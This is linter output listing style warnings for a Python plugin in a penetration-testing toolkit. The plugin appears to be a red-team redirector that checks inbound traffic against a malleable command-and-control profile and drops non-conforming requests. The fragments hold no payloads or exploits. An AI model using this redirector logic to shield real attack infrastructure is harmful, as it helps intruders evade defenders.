SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1998:25
     |
1996 |                 if processNodrops:
1997 |                     if ("options" not in entry.keys()) or (
1998 |                         "nodrop" not in entry["options"].keys()
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1999 |                     ):
2000 |                         continue
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2002:20
     |
2000 |                         continue
2001 |
2002 |                 if "nodrop" in entry["options"].keys():
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2003 |                     opts += ", nodrop"
     |
help: Remove `.keys()`

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2005:64
     |
2003 |                     opts += ", nodrop"
2004 |
2005 |                 if re.match("^" + url + "$", req.uri, re.I) != None:
     |                                                                ^^^^
2006 |                     self.logger.info(
2007 |                         '[ALLOW, {}, reason:0, {}]  Request conforms ProxyPass entry {} (url="{}" redir="{}"{}). Passing request to ΓÇª
     |
help: Replace with `cond is not None`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2007:25
     |
2005 |   ΓÇª     if re.match("^" + url + "$", req.uri, re.I) != None:
2006 |   ΓÇª         self.logger.info(
2007 | / ΓÇª             '[ALLOW, {}, reason:0, {}]  Request conforms ProxyPass entry {} (url="{}" redir="{}"{}). Passing request to specified ΓÇª
2008 | | ΓÇª                 ts, peerIP, num, url, host, opts
2009 | | ΓÇª             ),
     | |_______________^
2010 |   ΓÇª             color="green",
2011 |   ΓÇª         )
     |
help: Convert to f-string

F405 `proxy2_metadata_headers` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2020:37
     |
2018 |                     # req.headers['Host'] = host
2019 |                     if "/" in host:
2020 |                         req.headers[proxy2_metadata_headers["override_host_header"]] = (
     |                                     ^^^^^^^^^^^^^^^^^^^^^^^
2021 |                             host[: host.find("/")]
2022 |                         )
     |

F405 `proxy2_metadata_headers` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2025:37
     |
2023 |                         req.uri = host
2024 |                     else:
2025 |                         req.headers[proxy2_metadata_headers["override_host_header"]] = (
     |                                     ^^^^^^^^^^^^^^^^^^^^^^^
2026 |                             host
2027 |                         )
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2030:35
     |
2029 |                     if scheme and (scheme + "://" not in req.uri):
2030 |                         req.uri = "{}://{}".format(scheme, host)
     |                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2031 |
2032 |                     raise ProxyPlugin.AlterHostHeader(host)
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2036:25
     |
2034 |                   else:
2035 |                       self.logger.dbg(
2036 | /                         '(ProxyPass) Processed request with URL ("{}"...) didnt match ProxyPass entry {} URL regex: "^{}$".'.format(
2037 | |                             req.uri[:32], num, url
2038 | |                         )
     | |_________________________^
2039 |                       )
     |
help: Convert to f-string

N806 Variable `peerIP` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2042:9
     |
2041 |     def drop_check(self, req, req_body, malleable_meta):
2042 |         peerIP = self.get_peer_ip(req)
     |         ^^^^^^
2043 |         ts = datetime.now().strftime("%Y-%m-%d/%H:%M:%S")
2044 |         userAgentValue = req.headers.get("User-Agent")
     |

N806 Variable `userAgentValue` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2044:9
     |
2042 |         peerIP = self.get_peer_ip(req)
2043 |         ts = datetime.now().strftime("%Y-%m-%d/%H:%M:%S")
2044 |         userAgentValue = req.headers.get("User-Agent")
     |         ^^^^^^^^^^^^^^
2045 |
2046 |         self.processProxyPass(ts, peerIP, req, True)
     |

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2057:30
     |
2056 |         # User-agent conformancy
2057 |         if self.malleable != None:
     |                              ^^^^
2058 |             if (
2059 |                 userAgentValue != self.malleable.config["useragent"]
     |
help: Replace with `cond is not None`

F841 Local variable `fetched_uri` is assigned to but never used
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2086:9
     |
2084 |                     return self.report(True, ts, peerIP, req.uri, userAgentValue)
2085 |
2086 |         fetched_uri = ""
     |         ^^^^^^^^^^^
2087 |         fetched_host = req.headers["Host"]
     |
help: Remove assignment to unused variable `fetched_uri`

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2089:30
     |
2087 |         fetched_host = req.headers["Host"]
2088 |
2089 |         if self.malleable != None:
     |                              ^^^^
2090 |             for section in MalleableParser.ProtocolTransactions:
2091 |                 found = False
     |
help: Replace with `cond is not None`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2094:20
     |
2092 |                 variant = "default"
2093 |
2094 |                 if section not in self.malleable.config.keys():
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2095 |                     continue
     |
help: Remove `.keys()`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2101:28
     |
2099 |                 for uri in MalleableParser.UriParameters:
2100 |                     for var in self.malleable.variants:
2101 |                         if var not in block.keys():
     |                            ^^^^^^^^^^^^^^^^^^^^^^^
2102 |                             continue
2103 |                         if type(block[var]) != dict:
     |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2103:28
     |
2101 |                         if var not in block.keys():
2102 |                             continue
2103 |                         if type(block[var]) != dict:
     |                            ^^^^^^^^^^^^^^^^^^^^^^^^
2104 |                             continue
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2106:28
     |
2104 |                             continue
2105 |
2106 |                         if uri in block[var].keys():
     |                            ^^^^^^^^^^^^^^^^^^^^^^^^
2107 |                             _uri = block[var][uri]
     |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2109:32
     |
2107 |                             _uri = block[var][uri]
2108 |
2109 |                             if type(_uri) == str:
     |                                ^^^^^^^^^^^^^^^^^
2110 |                                 found = _uri in req.uri
     |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2112:35
     |
2110 |                                 found = _uri in req.uri
2111 |
2112 |                             elif (type(_uri) == list or type(_uri) == tuple) and len(
     |                                   ^^^^^^^^^^^^^^^^^^
2113 |                                 _uri
2114 |                             ) > 0:
     |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2112:57
     |
2110 |                                 found = _uri in req.uri
2111 |
2112 |                             elif (type(_uri) == list or type(_uri) == tuple) and len(
     |                                                         ^^^^^^^^^^^^^^^^^^^
2113 |                                 _uri
2114 |                             ) > 0:
     |

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2122:33
     |
2120 |   ΓÇª                     if found:
2121 |   ΓÇª                         variant = var
2122 | / ΓÇª                         if "client" in block[var].keys():
2123 | | ΓÇª                             if "header" in block[var]["client"].keys():
     | |_________________________________________________________________________^
2124 |   ΓÇª                                 for header in block[var]["client"]["header"]:
2125 |   ΓÇª                                     k, v = header
     |
help: Combine `if` statements using `and`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2122:36
     |
2120 | ΓÇª                     if found:
2121 | ΓÇª                         variant = var
2122 | ΓÇª                         if "client" in block[var].keys():
     |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2123 | ΓÇª                             if "header" in block[var]["client"].keys():
2124 | ΓÇª                                 for header in block[var]["client"]["header"]:
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2123:40
     |
2121 | ΓÇª                     variant = var
2122 | ΓÇª                     if "client" in block[var].keys():
2123 | ΓÇª                         if "header" in block[var]["client"].keys():
     |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2124 | ΓÇª                             for header in block[var]["client"]["header"]:
2125 | ΓÇª                                 k, v = header
     |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2138:25
     |
2136 |                     )
2137 |                     if (
2138 |                         type(malleable_meta["host"]) != str
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2139 |                         and len(malleable_meta["host"]) > 0
2140 |                     ):
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2152:29
     |
2150 |                       if self.is_request:
2151 |                           self.logger.info(
2152 | /                             "== Valid malleable {} (variant: {}) request inbound.".format(
2153 | |                                 section, variant
2154 | |                             )
     | |_____________________________^
2155 |                           )
2156 |                           self.printPeerInfos(peerIP)
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2164:21
     |
2162 |               ):
2163 |                   self.drop_reason(
2164 | /                     '[DROP, {}, reason:11a, {}] Requested URI does not align any of Malleable defined variants: "{}"'.format(
2165 | |                         ts, peerIP, req.uri
2166 | |                     )
     | |_____________________^
2167 |                   )
2168 |                   return self.report(True, ts, peerIP, req.uri, userAgentValue)
     |
help: Convert to f-string

N803 Argument name `peerIP` should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2177:30
     |
2175 |         return self.report(False, ts, peerIP, req.uri, userAgentValue)
2176 |
2177 |     def printPeerInfos(self, peerIP, returnInstead=False):
     |                              ^^^^^^
2178 |         global alreadyPrintedPeers
2179 |         try:
     |

N803 Argument name `returnInstead` should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2177:38
     |
2175 |         return self.report(False, ts, peerIP, req.uri, userAgentValue)
2176 |
2177 |     def printPeerInfos(self, peerIP, returnInstead=False):
     |                                      ^^^^^^^^^^^^^^^^^^^
2178 |         global alreadyPrintedPeers
2179 |         try:
     |

N806 Variable `ipLookupDetails` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2180:13
     |
2178 |         global alreadyPrintedPeers
2179 |         try:
2180 |             ipLookupDetails = self.ipLookupHelper.lookup(peerIP)
     |             ^^^^^^^^^^^^^^^
2181 |             if ipLookupDetails and len(ipLookupDetails) > 0:
2182 |                 if returnInstead:
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2190:21
     |
2189 |                   printit(
2190 | /                     "Here is what we know about that address ({}): ({})".format(
2191 | |                         peerIP, ipLookupDetails
2192 | |                     ),
     | |_____________________^
2193 |                       color="grey",
2194 |                   )
     |
help: Convert to f-string

F841 [*] Local variable `e` is assigned to but never used
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2199:29
     |
2198 |                 return ipLookupDetails
2199 |         except Exception as e:
     |                             ^
2200 |             pass
     |
help: Remove assignment to unused variable `e`

N803 Argument name `peerIP` should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2205:68
     |
2204 |     def _client_request_inspect(
2205 |         self, section, variant, req, req_body, malleable_meta, ts, peerIP
     |                                                                    ^^^^^^
2206 |     ):
2207 |         uri = req.uri
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2208:37
     |
2206 |     ):
2207 |         uri = req.uri
2208 |         rehdrskeys = [x.lower() for x in req.headers.keys()]
     |                                     ^^^^^^^^^^^^^^^^^^^^^^^
2209 |
2210 |         if self.malleable == None:
     |
help: Remove `.keys()`

E711 Comparison to `None` should be `cond is None`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2210:30
     |
2208 |         rehdrskeys = [x.lower() for x in req.headers.keys()]
2209 |
2210 |         if self.malleable == None:
     |                              ^^^^
2211 |             self.logger.dbg(
2212 |                 "(No malleable profile) Request contents validation skipped, as there was no profile provided.",
     |
help: Replace with `cond is None`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2218:13
     |
2217 |           self.logger.dbg(
2218 | /             "Deep request inspection of URI ({}) parsed as section:{}, variant:{}".format(
2219 | |                 req.uri, section, variant
2220 | |             )
     | |_____________^
2221 |           )
     |
help: Convert to f-string

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2224:13
     |
2223 |         if (
2224 |             section in self.malleable.config.keys()
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2225 |             and variant in self.malleable.config[section].keys()
2226 |         ):
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2225:17
     |
2223 |         if (
2224 |             section in self.malleable.config.keys()
2225 |             and variant in self.malleable.config[section].keys()
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2226 |         ):
2227 |             uris = []
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2232:20
     |
2231 |             for u in MalleableParser.UriParameters:
2232 |                 if u in configblock.keys():
     |                    ^^^^^^^^^^^^^^^^^^^^^^^
2233 |                     if type(configblock[u]) == str:
2234 |                         uris.append(configblock[u])
     |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2233:24
     |
2231 |             for u in MalleableParser.UriParameters:
2232 |                 if u in configblock.keys():
2233 |                     if type(configblock[u]) == str:
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^
2234 |                         uris.append(configblock[u])
2235 |                     else:
     |

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2246:20
     |
2245 |             for _block in blocks:
2246 |                 if "client" not in configblock.keys():
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2247 |                     continue
     |
help: Remove `.keys()`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2249:20
     |
2247 |                     continue
2248 |
2249 |                 if _block not in configblock["client"].keys():
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2250 |                     # self.logger.dbg('No block {} in [{}]'.format(_block, str(configblock['client'].keys())))
2251 |                     continue
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2255:21
     |
2253 |                 foundblocks.append(_block)
2254 |                 if (
2255 |                     "uri-append" in configblock["client"][_block].keys()
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2256 |                     or "parameter" in configblock["client"][_block].keys()
2257 |                 ):
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2256:24
     |
2254 |                 if (
2255 |                     "uri-append" in configblock["client"][_block].keys()
2256 |                     or "parameter" in configblock["client"][_block].keys()
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2257 |                 ):
2258 |                     exactmatch = False
     |
help: Remove `.keys()`

E712 Avoid equality comparisons to `True`; use `exactmatch:` for truth checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2261:20
     |
2260 |             for _uri in uris:
2261 |                 if exactmatch == True and uri == _uri:
     |                    ^^^^^^^^^^^^^^^^^^
2262 |                     found = True
2263 |                     if malleable_meta != None:
     |
help: Replace with `exactmatch`

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2263:42
     |
2261 |                 if exactmatch == True and uri == _uri:
2262 |                     found = True
2263 |                     if malleable_meta != None:
     |                                          ^^^^
2264 |                         malleable_meta["uri"] = uri
2265 |                     break
     |
help: Replace with `cond is not None`

E712 Avoid equality comparisons to `False`; use `not exactmatch:` for false checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2266:22
     |
2264 |                         malleable_meta["uri"] = uri
2265 |                     break
2266 |                 elif exactmatch == False:
     |                      ^^^^^^^^^^^^^^^^^^^
2267 |                     if uri.startswith(_uri):
2268 |                         found = True
     |
help: Replace with `not exactmatch`

E712 Avoid equality comparisons to `True`; use `exactmatch:` for truth checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2277:28
     |
2276 |                     for _uri in uris:
2277 |                         if exactmatch == True and uri == _uri:
     |                            ^^^^^^^^^^^^^^^^^^
2278 |                             found = True
2279 |                             if malleable_meta != None:
     |
help: Replace with `exactmatch`

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2279:50
     |
2277 |                         if exactmatch == True and uri == _uri:
2278 |                             found = True
2279 |                             if malleable_meta != None:
     |                                                  ^^^^
2280 |                                 malleable_meta["uri"] = uri
2281 |                             break
     |
help: Replace with `cond is not None`

E712 Avoid equality comparisons to `False`; use `not exactmatch:` for false checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2282:30
     |
2280 |                                 malleable_meta["uri"] = uri
2281 |                             break
2282 |                         elif exactmatch == False:
     |                              ^^^^^^^^^^^^^^^^^^^
2283 |                             if uri.startswith(_uri):
2284 |                                 found = True
     |
help: Replace with `not exactmatch`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2289:25
     |
2287 |                   if not found:
2288 |                       self.drop_reason(
2289 | /                         '[DROP, {}, reason:11b, {}] Requested URI does not align any of Malleable defined variants: "{}"'.format(
2290 | |                             ts, peerIP, req.uri
2291 | |                         )
     | |_________________________^
2292 |                       )
2293 |                       return True
     |
help: Convert to f-string

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2297:21
     |
2295 |             if section.lower() == "http-stager" and (
2296 |                 (
2297 |                     "uri_x64" in configblock.keys()
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2298 |                     and malleable_meta["uri"] == configblock["uri_x64"]
2299 |                 )
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2301:21
     |
2299 |                 )
2300 |                 or (
2301 |                     "uri_x86" in configblock.keys()
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2302 |                     and malleable_meta["uri"] == configblock["uri_x86"]
2303 |                 )
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2306:21
     |
2304 |             ):
2305 |                 if (
2306 |                     "host_stage" in self.malleable.config.keys()
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2307 |                     and self.malleable.config["host_stage"] == "false"
2308 |                 ):
     |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2310:25
     |
2308 |   ΓÇª     ):
2309 |   ΓÇª         self.drop_reason(
2310 | / ΓÇª             '[DROP, {}, reason:11c, {}] Requested URI referes to http-stager section however Payload staging was disabled: "{}"'.fΓÇª
2311 | | ΓÇª                 ts, peerIP, req.uri
2312 | | ΓÇª             )
     | |_______________^
2313 |   ΓÇª         )
2314 |   ΓÇª     return True
     |
help: Convert to f-string

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2331:25
     |
2330 |                       if (
2331 | /                         "protect_these_headers_from_tampering"
2332 | |                         in self.proxyOptions.keys()
     | |___________________________________________________^
2333 |                           and len(
2334 |                               self.proxyOptions["protect_these_headers_from_tampering"]
     |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2347:29
     |
2346 |   ΓÇª     self.logger.dbg(
2347 | / ΓÇª         "Inbound request did not contain expected by Malleable profile HTTP header named: {} . Restoring it to expected value as iΓÇª
2348 | | ΓÇª             k
2349 | | ΓÇª         )
     | |___________^
2350 |   ΓÇª     )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2355:29
     |
2353 |                       else:
2354 |                           self.drop_reason(
2355 | /                             '[DROP, {}, reason:5, {}] HTTP request did not contain expected header: "{}"'.format(
2356 | |                                 ts, peerIP, k
2357 | |                             )
     | |_____________________________^
2358 |                           )
2359 |                           return True
     |
help: Convert to f-string

F405 `proxy2_metadata_headers` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2376:37
     |
2374 |                         # del req.headers['Host']
2375 |                         # req.headers['Host'] = v
2376 |                         req.headers[proxy2_metadata_headers["override_host_header"]] = v
     |                                     ^^^^^^^^^^^^^^^^^^^^^^^
2377 |
2378 |                     if not ret:
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2380:29
     |
2378 |                       if not ret:
2379 |                           if (
2380 | /                             "protect_these_headers_from_tampering"
2381 | |                             in self.proxyOptions.keys()
     | |_______________________________________________________^
2382 |                               and len(
2383 |                                   self.proxyOptions[
     |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2398:33
     |
2397 |   ΓÇª     self.logger.dbg(
2398 | / ΓÇª         "Inbound request had HTTP Header ({})=({}) however ({}) was expected. Since this header was marked for protection - restorΓÇª
2399 | | ΓÇª             k, req.headers[k], hdrs2[k.lower()]
2400 | | ΓÇª         )
     | |___________^
2401 |   ΓÇª     )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2408:33
     |
2406 |                           else:
2407 |                               self.drop_reason(
2408 | /                                 '[DROP, {}, reason:6, {}] HTTP request did not contain expected header value: "{}: {}"'.format(
2409 | |                                     ts, peerIP, k, v
2410 | |                                 )
     | |_________________________________^
2411 |                               )
2412 |                               return True
     |
help: Convert to f-string

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2415:20
     |
2414 |             for _block in foundblocks:
2415 |                 if _block in configblock["client"].keys():
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2416 |                     metadata = configblock["client"][_block]
2417 |                     metadatacontainer = ""
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2419:24
     |
2417 |                     metadatacontainer = ""
2418 |
2419 |                     if "header" in metadata.keys():
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^
2420 |                         if (
2421 |                             metadata["header"].lower() not in rehdrskeys
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2441:26
     |
2439 |                             ]
2440 |
2441 |                     elif "parameter" in metadata.keys():
     |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2442 |                         out = parse_qs(urlsplit(req.uri).query)
     |
help: Remove `.keys()`

F841 Local variable `paramname` is assigned to but never used
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2444:25
     |
2442 |                         out = parse_qs(urlsplit(req.uri).query)
2443 |
2444 |                         paramname = metadata["parameter"]
     |                         ^^^^^^^^^
2445 |                         if (
2446 |                             metadata["parameter"] not in out.keys()
     |
help: Remove assignment to unused variable `paramname`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2446:29
     |
2444 |                         paramname = metadata["parameter"]
2445 |                         if (
2446 |                             metadata["parameter"] not in out.keys()
     |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2447 |                             and self.proxyOptions["policy"][
2448 |                                 "drop_malleable_without_request_section_in_uri"
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2463:26
     |
2461 |                         ]
2462 |
2463 |                     elif "uri-append" in metadata.keys():
     |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2464 |                         if not self.proxyOptions["policy"][
2465 |                             "drop_malleable_with_invalid_uri_append"
     |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2474:37
     |
2472 |                         metadatacontainer = req.uri
2473 |
2474 |                     self.logger.dbg("Metadata container: {}".format(metadatacontainer))
     |                                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2475 |
2476 |                     if "prepend" in metadata.keys():
     |
help: Convert to f-string

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2476:24
     |
2474 |                     self.logger.dbg("Metadata container: {}".format(metadatacontainer))
2475 |
2476 |                     if "prepend" in metadata.keys():
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2477 |                         if type(metadata["prepend"]) == list:
2478 |                             for p in metadata["prepend"]:
     |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2477:28
     |
2476 |                     if "prepend" in metadata.keys():
2477 |                         if type(metadata["prepend"]) == list:
     |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2478 |                             for p in metadata["prepend"]:
2479 |                                 if (
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2486:41
     |
2484 |   ΓÇª                     ):
2485 |   ΓÇª                         self.drop_reason(
2486 | / ΓÇª                             '[DROP, {}, reason:9, {}] Did not found prepend pattern: "{}"'.format(
2487 | | ΓÇª                                 ts, peerIP, p
2488 | | ΓÇª                             )
     | |_______________________________^
2489 |   ΓÇª                         )
2490 |   ΓÇª                         if len(metadata["prepend"]) > 1:
     |
help: Convert to f-string

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2496:25
     |
2494 |                                       return True
2495 |
2496 | /                         elif type(metadata["prepend"]) == str:
2497 | |                             if (
2498 | |                                 metadata["prepend"] not in metadatacontainer
2499 | |                                 and self.proxyOptions["policy"][
2500 | |                                     "drop_malleable_without_prepend_pattern"
2501 | |                                 ]
2502 | |                             ):
     | |______________________________^
2503 |                                   self.drop_reason(
2504 |                                       '[DROP, {}, reason:9, {}] Did not found prepend pattern: "{}"'.format(
     |
help: Combine `if` statements using `and`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2496:30
     |
2494 |                                     return True
2495 |
2496 |                         elif type(metadata["prepend"]) == str:
     |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2497 |                             if (
2498 |                                 metadata["prepend"] not in metadatacontainer
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2514:24
     |
2512 |                                 return True
2513 |
2514 |                     if "append" in metadata.keys():
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^
2515 |                         if type(metadata["append"]) == list:
2516 |                             for p in metadata["append"]:
     |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2515:28
     |
2514 |                     if "append" in metadata.keys():
